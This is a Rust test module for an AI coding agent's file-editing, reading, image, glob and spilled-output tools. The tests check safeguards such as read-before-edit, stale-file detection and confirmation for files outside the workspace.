    fn edit_args(old: &str, new: &str) -> serde_json::Value {
        json!({ "file_path": "f.txt", "old_string": old, "new_string": new })
    }

    #[tokio::test]
    async fn edit_and_overwrite_require_a_prior_read() {
        let (ws, ctx) = observed_ctx("unread");
        fs::write(ws.join("f.txt"), "alpha\n").unwrap();

        let out = EditTool.execute(edit_args("alpha", "beta"), &ctx).await.unwrap();
        assert!(out.is_error && out.output.contains("has not been read"), "{}", out.output);

        let out = WriteFileTool
            .execute(json!({ "file_path": "f.txt", "content": "x" }), &ctx)
            .await
            .unwrap();
        assert!(out.is_error && out.output.contains("has not been read"), "{}", out.output);
        assert_eq!(fs::read_to_string(ws.join("f.txt")).unwrap(), "alpha\n");

        // Creating a brand-new file needs no prior read.
        let out = WriteFileTool
            .execute(json!({ "file_path": "new.txt", "content": "hi" }), &ctx)
            .await
            .unwrap();
        assert!(!out.is_error, "{}", out.output);
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn edit_after_read_succeeds_and_own_edits_are_not_external_changes() {
        let (ws, ctx) = observed_ctx("read");
        fs::write(ws.join("f.txt"), "alpha\nbeta\n").unwrap();
        ReadFileTool.execute(json!({ "file_path": "f.txt" }), &ctx).await.unwrap();

        let out = EditTool.execute(edit_args("alpha", "one"), &ctx).await.unwrap();
        assert!(!out.is_error, "{}", out.output);
        // A second edit without re-reading must still work: the first edit updated the record.
        let out = EditTool.execute(edit_args("beta", "two"), &ctx).await.unwrap();
        assert!(!out.is_error, "{}", out.output);
        assert_eq!(fs::read_to_string(ws.join("f.txt")).unwrap(), "one\ntwo\n");
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn edit_refuses_a_file_changed_externally_since_the_read() {
        let (ws, ctx) = observed_ctx("stale");
        fs::write(ws.join("f.txt"), "alpha\n").unwrap();
        ReadFileTool.execute(json!({ "file_path": "f.txt" }), &ctx).await.unwrap();

        // Another process rewrites the file (different length, so the stamp differs for sure).
        fs::write(ws.join("f.txt"), "alpha, edited elsewhere\n").unwrap();

        let out = EditTool.execute(edit_args("alpha", "beta"), &ctx).await.unwrap();
        assert!(out.is_error && out.output.contains("changed since it was read"), "{}", out.output);

        // Re-reading restores the ability to edit.
        ReadFileTool.execute(json!({ "file_path": "f.txt" }), &ctx).await.unwrap();
        let out = EditTool.execute(edit_args("alpha", "beta"), &ctx).await.unwrap();
        assert!(!out.is_error, "{}", out.output);
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn write_file_keeps_crlf_of_the_existing_file() {
        let (ws, ctx) = observed_ctx("crlf");
        fs::write(ws.join("f.txt"), "a\r\nb\r\n").unwrap();
        ReadFileTool.execute(json!({ "file_path": "f.txt" }), &ctx).await.unwrap();

        let out = WriteFileTool
            .execute(json!({ "file_path": "f.txt", "content": "x\ny\n" }), &ctx)
            .await
            .unwrap();
        assert!(!out.is_error, "{}", out.output);
        assert_eq!(fs::read_to_string(ws.join("f.txt")).unwrap(), "x\r\ny\r\n");
        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn atomic_create_never_replaces_an_existing_file() {
        let ws = std::env::temp_dir().join(format!("corex_create_{}", std::process::id()));
        let _ = fs::remove_dir_all(&ws);
        fs::create_dir_all(&ws).unwrap();
        let target = ws.join("n.txt");

        atomic_create(&target, "first").unwrap();
        let err = atomic_create(&target, "second").unwrap_err();
        assert_eq!(err.kind(), std::io::ErrorKind::AlreadyExists);
        assert_eq!(fs::read_to_string(&target).unwrap(), "first");
        let leftovers = fs::read_dir(&ws).unwrap().count();
        assert_eq!(leftovers, 1, "no temp files may be left behind");
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn read_file_truncates_huge_lines_and_pages_by_bytes() {
        let (ws, ctx) = observed_ctx("readcaps");
        let long = "x".repeat(READ_MAX_LINE_CHARS + 500);
        fs::write(ws.join("min.js"), format!("{}\nshort\n", long)).unwrap();
        let out = ReadFileTool.execute(json!({ "file_path": "min.js" }), &ctx).await.unwrap();
        assert!(out.output.contains("line truncated"), "{}", out.output);
        assert!(out.output.len() < READ_MAX_LINE_CHARS + 200);

        let big: String = (0..3000).map(|i| format!("{:0>60}\n", i)).collect();
        fs::write(ws.join("big.txt"), big).unwrap();
        let out = ReadFileTool.execute(json!({ "file_path": "big.txt" }), &ctx).await.unwrap();
        assert!(out.output.len() < READ_MAX_OUTPUT_BYTES + 1024);
        assert!(out.output.contains("Specify start_line="), "{}", out.output);

        fs::write(ws.join("bad.txt"), [0x66u8, 0xff, 0xfe, 0x67]).unwrap();
        let out = ReadFileTool.execute(json!({ "file_path": "bad.txt" }), &ctx).await.unwrap();
        assert!(out.is_error && out.output.contains("not valid UTF-8"), "{}", out.output);
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn read_image_queues_the_image_and_rejects_non_images() {
        let (ws, ctx) = observed_ctx("img");
        // Smallest valid-looking PNG header is enough: only the signature is sniffed.
        let mut png = vec![0x89, b'P', b'N', b'G', 0x0d, 0x0a, 0x1a, 0x0a];
        png.extend_from_slice(&[0u8; 16]);
        fs::write(ws.join("shot"), &png).unwrap(); // no extension on purpose
        fs::write(ws.join("notes.png"), "just text").unwrap();

        let _ = corex_core::drain_tool_images_message();
        let out = ReadImageTool.execute(json!({ "file_path": "shot" }), &ctx).await.unwrap();
        assert!(!out.is_error, "{}", out.output);
        assert!(out.output.contains("image/png"));
        let msg = corex_core::drain_tool_images_message().expect("image queued");
        assert_eq!(msg.role, "user");

        let out = ReadImageTool.execute(json!({ "file_path": "notes.png" }), &ctx).await.unwrap();
        assert!(out.is_error && out.output.contains("not a supported image"), "{}", out.output);

        // read_file on a binary image points the model at read_image.
        let out = ReadFileTool.execute(json!({ "file_path": "shot" }), &ctx).await.unwrap();
        assert!(out.output.contains("read_image"), "{}", out.output);
        let _ = fs::remove_dir_all(&ws);
    }

    #[tokio::test]
    async fn glob_shows_newest_first_and_saves_the_full_list_when_large() {
        let (ws, ctx) = observed_ctx("glob");
        for i in 0..130 {
            fs::write(ws.join(format!("f{:03}.txt", i)), "x").unwrap();
        }
        let out = GlobTool.execute(json!({ "pattern": "*.txt" }), &ctx).await.unwrap();
        assert!(!out.is_error);
        assert!(out.output.contains("Found 130 matching files; showing the 100 newest"), "{}", out.output);
        assert!(out.output.contains("30 more not shown"), "{}", out.output);
        let saved = out
            .output
            .split("saved at ")
            .nth(1)
            .and_then(|r| r.split_whitespace().next())
            .expect("a saved path");
        assert_eq!(fs::read_to_string(saved).unwrap().lines().count(), 130);
        let _ = fs::remove_file(saved);

        let out = GlobTool.execute(json!({ "pattern": "f00*.txt" }), &ctx).await.unwrap();
        assert!(out.output.contains("Found 10 matching file(s)"), "{}", out.output);
        let _ = fs::remove_dir_all(&ws);
    }

    #[test]
    fn spilled_output_can_be_read_back_without_confirmation() {
        let (ws, ctx) = observed_ctx("spillread");
        let spilled = corex_core::spill_large_output("grep_search", "x".repeat(40_000));
        let path = spilled
            .split("saved at ")
            .nth(1)
            .and_then(|r| r.split(" — ").next())
            .unwrap()
            .to_string();
        assert!(!ReadFileTool.needs_confirmation(&json!({ "file_path": path }), &ctx));
        // Other files outside the workspace still need it.
        assert!(ReadFileTool.needs_confirmation(&json!({ "file_path": "/etc/hostname" }), &ctx));
        let _ = fs::remove_file(&path);
        let _ = fs::remove_dir_all(&ws);
    }
}
